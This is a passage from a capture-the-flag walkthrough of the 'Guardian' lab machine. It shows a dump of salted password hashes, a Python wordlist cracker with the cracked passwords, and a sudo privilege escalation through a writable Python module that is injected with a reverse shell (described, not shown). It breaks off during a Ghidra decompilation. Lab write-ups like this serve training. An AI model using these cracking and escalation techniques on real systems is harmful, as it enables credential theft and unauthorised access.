class="line">| mark.pargetter     | 8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e |</span><br><span class="line">| valentijn.temby    | 1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6 |</span><br><span class="line">| leyla.rippin       | 7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61 |</span><br><span class="line">| perkin.fillon      | 4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471 |</span><br><span class="line">| cyrus.booth        | 23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6 |</span><br><span class="line">| sammy.treat        | c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2 |</span><br><span class="line">| crin.hambidge      | 9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75 |</span><br><span class="line">| myra.galsworthy    | ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4 |</span><br><span class="line">| mireielle.feek     | 18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3 |</span><br><span class="line">| vivie.smallthwaite | b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a |</span><br><span class="line">| GU0142023          | 5381d07c15c0f0107471d25a30f5a10c4fd507abe322853c178ff9c66e916829 |</span><br><span class="line">| GU6262023          | 87847475fa77edfcf2c9e0973a91c9b48ba850e46a940828dfeba0754586938f |</span><br><span class="line">| GU0702025          | 48b16b7f456afa78ba00b2b64b4367ded7d4e3daebf08b13ff71a1e0a3103bb1 |</span><br><span class="line">| GU0762023          | e7ff40179d9a905bc8916e020ad97596548c0f2246bfb7df9921cc8cdaa20ac2 |</span><br><span class="line">| GU9492024          | 8ae72472bd2d81f774674780aef36fc20a0234e62cdd4889f7b5a6571025b8d1 |</span><br><span class="line">| GU9612024          | cf54d11e432e53262f32e799c6f02ca2130ae3cff5f595d278d071ecf4aeaf57 |</span><br><span class="line">| GU7382024          | 7852ec8fcfded3f1f6b343ec98adde729952b630bef470a75d4e3e0da7ceea1a |</span><br><span class="line">| GU6632023          | 98687fb5e0d6c9004c09dadbe85b69133fd24d5232ff0a3cf3f768504e547714 |</span><br><span class="line">| GU1922024          | bf5137eb097e9829f5cd41f58fc19ed472381d02f8f635b2e57a248664dd35cd |</span><br><span class="line">| GU8032023          | 41b217df7ff88d48dac1884a8c539475eb7e7316f33d1ca5a573291cfb9a2ada |</span><br><span class="line">| GU5852023          | e02610ca77a91086c85f93da430fd2f67f796aab177c88d789720ca9b724492a |</span><br><span class="line">| GU0712023          | e6aad48962fd44e506ac16d81b5e4587cad2fd2dc51aabbf193f4fd29d036a7a |</span><br><span class="line">| GU1592025          | 1710aed05bca122521c02bff141c259a81a435f900620306f92b840d4ba79c71 |</span><br><span class="line">| GU1112023          | 168ae18404da4fff097f9218292ae8f93d6c3ac532e609b07a1c1437f2916a7d |</span><br><span class="line">| GU6432025          | a28e58fd78fa52c651bfee842b1d3d8f5873ae00a4af56a155732a4a6be41bc6 |</span><br><span class="line">| GU3042024          | d72fc47472a863fafea2010efe6cd4e70976118babaa762fef8b68a35814e9ab |</span><br><span class="line">| GU1482025          | be0145f24b8f6943fd949b7ecaee55bb9d085eb3e81746826374c52e1060785f |</span><br><span class="line">| GU3102024          | 3aa2232d08262fca8db495c84bd45d8c560e634d5dff8566f535108cf1cc0706 |</span><br><span class="line">| GU7232023          | 4813362e8d6194abfb20154ba3241ade8806445866bce738d24888aa1aa9bea6 |</span><br><span class="line">| GU8912024          | 6c249ab358f6adfc67aecb4569dae96d8a57e3a64c82808f7cede41f9a330c51 |</span><br><span class="line">| GU4752025          | 4d7625ec0d45aa83ef374054c8946497a798ca6a3474f76338f0ffe829fced1a |</span><br><span class="line">| GU9602024          | 6eeb4b329b7b7f885df9757df3a67247df0a7f14b539f01d3cb988e4989c75e2 |</span><br><span class="line">| GU4382025          | 8d57c0124615f5c82cabfdd09811251e7b2d70dcf2d3a3b3942a31c294097ec8 |</span><br><span class="line">| GU7352023          | 8c9a8f4a6daceecb6fff0eae3830d16fe7e05a98101cb21f1b06d592a33cb005 |</span><br><span class="line">| GU3042025          | 1d87078236f9da236a92f42771749dad4eea081a08a5da2ed3fa5a11d85fa22f |</span><br><span class="line">| GU3872024          | 12a2fe5b87191fedadc7d81dee2d483ab2508650d96966000f8e1412ca9cd74a |</span><br><span class="line">| GU7462025          | 5e95bfd3675d0d995027c392e6131bf99cf2cfba73e08638fa1c48699cdb9dfa |</span><br><span class="line">| GU3902023          | 6b4502ad77cf9403e9ac3338ff7da1c08688ef2005dae839c1cd6e07e1f6409b |</span><br><span class="line">| GU1832025          | 6ab453e985e31ef54419376be906f26fff02334ec5f26a681d90c32aec6d311f |</span><br><span class="line">| GU3052024          | 1cde419d7f3145bcfcbf9a34f80452adf979f71496290cf850944d527cda733f |</span><br><span class="line">| GU3612023          | 7ba8a71e39c1697e0bfa66052285157d2984978404816c93c2a3ddaba6455e3a |</span><br><span class="line">| GU7022023          | 7a02cc632b8cb1a6f036cb2c963c084ffea9184a92259d932e224932fdad81a8 |</span><br><span class="line">| GU1712025          | ebfa2119ebe2aaed2c329e25ce2e5ed8efa2d78e72c273bb91ff968d02ee5225 |</span><br><span class="line">| GU9362023          | 8b7ce469fb40e88472c9006cb1d65ffa20b2f9c41e983d49ca0cdf642d8f1592 |</span><br><span class="line">| GU5092024          | 11ae26f27612b1adca57f14c379a8cc6b4fc5bdfcfd21bef7a8b0172b7ab4380 |</span><br><span class="line">| GU5252023          | 70a03bb2060c5e14b33c393970e655f04d11f02d71f6f44715f6fe37784c64fa |</span><br><span class="line">| GU8802025          | 7ae4ac47f05407862cb2fcd9372c73641c822bbc7fc07ed9d16e6b63c2001d76 |</span><br><span class="line">| GU2222023          | d3a175c6e9da02ae83ef1f2dd1f59e59b8a63e5895b81354f7547714216bbdcd |</span><br><span class="line">| GU9802023          | a03da309de0a60f762ce31d0bde5b9c25eb59e740719fc411226a24e72831f5c |</span><br><span class="line">| GU3122025          | e96399fcdb8749496abc6d53592b732b1b2acb296679317cf59f104a5f51343a |</span><br><span class="line">| GU2062025          | 0ece0b43e6019e297e0bce9f07f200ff03d629edbed88d4f12f2bad27e7f4df8 |</span><br><span class="line">| GU3992025          | b86518d246a22f4f5938444aa18f2893c4cccabbe90ca48a16be42317aec96a0 |</span><br><span class="line">| GU1662024          | 5c28cd405a6c0543936c9d010b7471436a7a33fa64f5eb3e84ab9f7acc9a16e5 |</span><br><span class="line">| GU9972025          | 339d519ef0c55e63ebf4a8fde6fda4bca4315b317a1de896fb481bd0834cc599 |</span><br><span class="line">| GU6822025          | 298560c0edce3451fd36b69a15792cbb637c8366f058cf674a6964ff34306482 |</span><br><span class="line">| GU7912023          | 8236b81b5f67c798dd5943bca91817558e987f825b6aae72a592c8f1eaeee021 |</span><br><span class="line">| GU3622024          | 1c92182d9a59d77ea20c0949696711d8458c870126cf21330f61c2cba6ae6bcf |</span><br><span class="line">| GU2002023          | 3c378b73442c2cf911f2a157fc9e26ecde2230313b46876dab12a661169ed6e2 |</span><br><span class="line">| GU3052023          | 2ef01f607f86387d0c94fc2a3502cc3e6d8715d3b1f124b338623b41aed40cf8 |</span><br><span class="line">| GU1462023          | 585aacf74b22a543022416ed771dca611bd78939908c8323f4f5efef5b4e0202 |</span><br><span class="line">| chemas             | 6f4bc3c67e7920950dfe1d9bd6958f6e48c79fadb92e173c4c8e257f553987e1 |</span><br><span class="line">+--------------------+------------------------------------------------------------------+</span><br><span class="line">63 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>The password scheme is <code>sha256(plaintext_password + salt)</code>. We write a Python script to crack them (john&#x2F;hashcat would also work):</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">[root@Hacking] /home/kali/Guardian</span><br><span class="line">❯ cat hashes.txt</span><br><span class="line">admin:694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6</span><br><span class="line">jamil.enockson:c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250</span><br><span class="line">mark.pargetter:8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e</span><br><span class="line">valentijn.temby:1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6</span><br><span class="line">leyla.rippin:7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61</span><br><span class="line">perkin.fillon:4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471</span><br><span class="line">cyrus.booth:23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6</span><br><span class="line">sammy.treat:c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2</span><br><span class="line">crin.hambidge:9b6e003386cd1e24c97661ab4ad2c94cc844789b3916f681ea39c1cbf13c8c75</span><br><span class="line">myra.galsworthy:ba227588efcb86dcf426c5d5c1e2aae58d695d53a1a795b234202ae286da2ef4</span><br><span class="line">mireielle.feek:18448ce8838aab26600b0a995dfebd79cc355254283702426d1056ca6f5d68b3</span><br><span class="line">vivie.smallthwaite:b88ac7727aaa9073aa735ee33ba84a3bdd26249fc0e59e7110d5bcdb4da4031a</span><br><span class="line">GU0142023:5381d07c15c0f0107471d25a30f5a10c4fd507abe322853c178ff9c66e916829</span><br><span class="line">GU6262023:87847475fa77edfcf2c9e0973a91c9b48ba850e46a940828dfeba0754586938f</span><br><span class="line">GU0702025:48b16b7f456afa78ba00b2b64b4367ded7d4e3daebf08b13ff71a1e0a3103bb1</span><br><span class="line">GU0762023:e7ff40179d9a905bc8916e020ad97596548c0f2246bfb7df9921cc8cdaa20ac2</span><br><span class="line">GU9492024:8ae72472bd2d81f774674780aef36fc20a0234e62cdd4889f7b5a6571025b8d1</span><br><span class="line">GU9612024:cf54d11e432e53262f32e799c6f02ca2130ae3cff5f595d278d071ecf4aeaf57</span><br><span class="line">GU7382024:7852ec8fcfded3f1f6b343ec98adde729952b630bef470a75d4e3e0da7ceea1a</span><br><span class="line">GU6632023:98687fb5e0d6c9004c09dadbe85b69133fd24d5232ff0a3cf3f768504e547714</span><br><span class="line">GU1922024:bf5137eb097e9829f5cd41f58fc19ed472381d02f8f635b2e57a248664dd35cd</span><br><span class="line">GU8032023:41b217df7ff88d48dac1884a8c539475eb7e7316f33d1ca5a573291cfb9a2ada</span><br><span class="line">GU5852023:e02610ca77a91086c85f93da430fd2f67f796aab177c88d789720ca9b724492a</span><br><span class="line">GU0712023:e6aad48962fd44e506ac16d81b5e4587cad2fd2dc51aabbf193f4fd29d036a7a</span><br><span class="line">GU1592025:1710aed05bca122521c02bff141c259a81a435f900620306f92b840d4ba79c71</span><br><span class="line">GU1112023:168ae18404da4fff097f9218292ae8f93d6c3ac532e609b07a1c1437f2916a7d</span><br><span class="line">GU6432025:a28e58fd78fa52c651bfee842b1d3d8f5873ae00a4af56a155732a4a6be41bc6</span><br><span class="line">GU3042024:d72fc47472a863fafea2010efe6cd4e70976118babaa762fef8b68a35814e9ab</span><br><span class="line">GU1482025:be0145f24b8f6943fd949b7ecaee55bb9d085eb3e81746826374c52e1060785f</span><br><span class="line">GU3102024:3aa2232d08262fca8db495c84bd45d8c560e634d5dff8566f535108cf1cc0706</span><br><span class="line">GU7232023:4813362e8d6194abfb20154ba3241ade8806445866bce738d24888aa1aa9bea6</span><br><span class="line">GU8912024:6c249ab358f6adfc67aecb4569dae96d8a57e3a64c82808f7cede41f9a330c51</span><br><span class="line">GU4752025:4d7625ec0d45aa83ef374054c8946497a798ca6a3474f76338f0ffe829fced1a</span><br><span class="line">GU9602024:6eeb4b329b7b7f885df9757df3a67247df0a7f14b539f01d3cb988e4989c75e2</span><br><span class="line">GU4382025:8d57c0124615f5c82cabfdd09811251e7b2d70dcf2d3a3b3942a31c294097ec8</span><br><span class="line">GU7352023:8c9a8f4a6daceecb6fff0eae3830d16fe7e05a98101cb21f1b06d592a33cb005</span><br><span class="line">GU3042025:1d87078236f9da236a92f42771749dad4eea081a08a5da2ed3fa5a11d85fa22f</span><br><span class="line">GU3872024:12a2fe5b87191fedadc7d81dee2d483ab2508650d96966000f8e1412ca9cd74a</span><br><span class="line">GU7462025:5e95bfd3675d0d995027c392e6131bf99cf2cfba73e08638fa1c48699cdb9dfa</span><br><span class="line">GU3902023:6b4502ad77cf9403e9ac3338ff7da1c08688ef2005dae839c1cd6e07e1f6409b</span><br><span class="line">GU1832025:6ab453e985e31ef54419376be906f26fff02334ec5f26a681d90c32aec6d311f</span><br><span class="line">GU3052024:1cde419d7f3145bcfcbf9a34f80452adf979f71496290cf850944d527cda733f</span><br><span class="line">GU3612023:7ba8a71e39c1697e0bfa66052285157d2984978404816c93c2a3ddaba6455e3a</span><br><span class="line">GU7022023:7a02cc632b8cb1a6f036cb2c963c084ffea9184a92259d932e224932fdad81a8</span><br><span class="line">GU1712025:ebfa2119ebe2aaed2c329e25ce2e5ed8efa2d78e72c273bb91ff968d02ee5225</span><br><span class="line">GU9362023:8b7ce469fb40e88472c9006cb1d65ffa20b2f9c41e983d49ca0cdf642d8f1592</span><br><span class="line">GU5092024:11ae26f27612b1adca57f14c379a8cc6b4fc5bdfcfd21bef7a8b0172b7ab4380</span><br><span class="line">GU5252023:70a03bb2060c5e14b33c393970e655f04d11f02d71f6f44715f6fe37784c64fa</span><br><span class="line">GU8802025:7ae4ac47f05407862cb2fcd9372c73641c822bbc7fc07ed9d16e6b63c2001d76</span><br><span class="line">GU2222023:d3a175c6e9da02ae83ef1f2dd1f59e59b8a63e5895b81354f7547714216bbdcd</span><br><span class="line">GU9802023:a03da309de0a60f762ce31d0bde5b9c25eb59e740719fc411226a24e72831f5c</span><br><span class="line">GU3122025:e96399fcdb8749496abc6d53592b732b1b2acb296679317cf59f104a5f51343a</span><br><span class="line">GU2062025:0ece0b43e6019e297e0bce9f07f200ff03d629edbed88d4f12f2bad27e7f4df8</span><br><span class="line">GU3992025:b86518d246a22f4f5938444aa18f2893c4cccabbe90ca48a16be42317aec96a0</span><br><span class="line">GU1662024:5c28cd405a6c0543936c9d010b7471436a7a33fa64f5eb3e84ab9f7acc9a16e5</span><br><span class="line">GU9972025:339d519ef0c55e63ebf4a8fde6fda4bca4315b317a1de896fb481bd0834cc599</span><br><span class="line">GU6822025:298560c0edce3451fd36b69a15792cbb637c8366f058cf674a6964ff34306482</span><br><span class="line">GU7912023:8236b81b5f67c798dd5943bca91817558e987f825b6aae72a592c8f1eaeee021</span><br><span class="line">GU3622024:1c92182d9a59d77ea20c0949696711d8458c870126cf21330f61c2cba6ae6bcf</span><br><span class="line">GU2002023:3c378b73442c2cf911f2a157fc9e26ecde2230313b46876dab12a661169ed6e2</span><br><span class="line">GU3052023:2ef01f607f86387d0c94fc2a3502cc3e6d8715d3b1f124b338623b41aed40cf8</span><br><span class="line">GU1462023:585aacf74b22a543022416ed771dca611bd78939908c8323f4f5efef5b4e0202</span><br><span class="line">zero:1598cf89b66bfdece7054344780add5f5d1135efd34cbf5dbb845ac2c2d0f42f</span><br><span class="line">attacker:554fef79f3500e339cb5af09847a95b6dc32bb0d401c35ca50a55ef27807f152</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">SALT = <span class="string">&quot;8Sb)tM1vs1SS&quot;</span></span><br><span class="line">WORDLIST = <span class="string">&quot;/usr/share/wordlists/rockyou.txt&quot;</span></span><br><span class="line">HASH_FILE = <span class="string">&quot;hashes.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_password</span>(<span class="params">password: <span class="built_in">str</span>, target_hash: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    hashed = hashlib.sha256((password + SALT).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> hashed == target_hash</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(HASH_FILE, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        user, target_hash = line.strip().split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(WORDLIST, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;latin-1&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> wf:</span><br><span class="line">            <span class="keyword">for</span> pwd <span class="keyword">in</span> wf:</span><br><span class="line">                pwd = pwd.strip()</span><br><span class="line">                <span class="keyword">if</span> check_password(pwd, target_hash):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] Found password for <span class="subst">&#123;user&#125;</span>: <span class="subst">&#123;pwd&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] Password for <span class="subst">&#123;user&#125;</span> not found&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>We crack two passwords:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin:fakebake000</span><br><span class="line">jamil.enockson:copperhouse56</span><br></pre></td></tr></table></figure></div>
+
+<p>We <code>su</code> to <code>jamil</code> with <code>copperhouse56</code> and grab the user flag:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">www-data@guardian:~/portal.guardian.htb/admin$ su jamil</span><br><span class="line">su jamil</span><br><span class="line">Password: copperhouse56</span><br><span class="line"></span><br><span class="line">jamil@guardian:/var/www/portal.guardian.htb/admin$ cd</span><br><span class="line">cd</span><br><span class="line">jamil@guardian:~$ ls</span><br><span class="line">ls</span><br><span class="line">user.txt</span><br><span class="line">jamil@guardian:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">ba38dedf2c3f705586aab18cbafdc1f3</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Privilege-Escalation-jamil-→-mark"><a href="#Privilege-Escalation-jamil-→-mark" class="headerlink" title="Privilege Escalation - jamil → mark"></a>Privilege Escalation - jamil → mark</h2><p>Checking sudo privileges:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">jamil@guardian:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for jamil on guardian:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User jamil may run the following commands on guardian:</span><br><span class="line">    (mark) NOPASSWD: /opt/scripts/utilities/utilities.py</span><br><span class="line">jamil@guardian:~$</span><br></pre></td></tr></table></figure></div>
+
+<p>The script imports modules from a <code>utils</code> directory:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> db</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> attachments</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> logs</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> status</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;University Server Utilities Toolkit&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;action&quot;</span>, choices=[</span><br><span class="line">        <span class="string">&quot;backup-db&quot;</span>,</span><br><span class="line">        <span class="string">&quot;zip-attachments&quot;</span>,</span><br><span class="line">        <span class="string">&quot;collect-logs&quot;</span>,</span><br><span class="line">        <span class="string">&quot;system-status&quot;</span></span><br><span class="line">    ], <span class="built_in">help</span>=<span class="string">&quot;Action to perform&quot;</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    user = getpass.getuser()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.action == <span class="string">&quot;backup-db&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> user != <span class="string">&quot;mark&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Access denied.&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        db.backup_database()</span><br><span class="line">    <span class="keyword">elif</span> args.action == <span class="string">&quot;zip-attachments&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> user != <span class="string">&quot;mark&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Access denied.&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        attachments.zip_attachments()</span><br><span class="line">    <span class="keyword">elif</span> args.action == <span class="string">&quot;collect-logs&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> user != <span class="string">&quot;mark&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Access denied.&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        logs.collect_logs()</span><br><span class="line">    <span class="keyword">elif</span> args.action == <span class="string">&quot;system-status&quot;</span>:</span><br><span class="line">        status.system_status()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Unknown action.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
+
+<p>The script receives an <code>action</code> parameter: <code>backup-db</code>, <code>zip-attachments</code>, <code>collect-logs</code>, <code>system-status</code>. The first three actions require the <code>mark</code> user, otherwise access is denied. <code>system-status</code> is unrestricted — any user can run it. Internally it calls submodule functions under <code>utils</code> (e.g. <code>db.backup_database()</code>).</p>
+<p>Looking at the files in the <code>utils</code> directory, we find that <code>status.py</code> is writable:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jamil@guardian:/opt/scripts/utilities/utils$ ls -al</span><br><span class="line">total 24</span><br><span class="line">drwxrwsr-x 2 root root   4096 Jul 10 14:20 .</span><br><span class="line">drwxr-sr-x 4 root admins 4096 Jul 10 13:53 ..</span><br><span class="line">-rw-r----- 1 root admins  287 Apr 19 08:15 attachments.py</span><br><span class="line">-rw-r----- 1 root admins  246 Jul 10 14:20 db.py</span><br><span class="line">-rw-r----- 1 root admins  226 Apr 19 08:16 logs.py</span><br><span class="line">-rwxrwx--- 1 mark admins  253 Apr 26 09:45 status.py</span><br><span class="line">jamil@guardian:/opt/scripts/utilities/utils$</span><br></pre></td></tr></table></figure></div>
+
+<p>We inject a reverse shell into <code>status.py</code> and run <code>sudo -u mark /opt/scripts/utilities/utilities.py system-status</code> to get a shell as <code>mark</code>.</p>
+<h2 id="Privilege-Escalation-mark-→-root"><a href="#Privilege-Escalation-mark-→-root" class="headerlink" title="Privilege Escalation - mark → root"></a>Privilege Escalation - mark → root</h2><p>As <code>mark</code>, we find <code>/usr/local/bin/safeapache2ctl</code>. Decompiling it with Ghidra reveals the <code>main</code> function:</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">int</span> param_1,undefined8 *param_2)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> bVar1;</span><br><span class="line">  <span class="type">int</span> iVar2;</span><br><span class="line">  <span 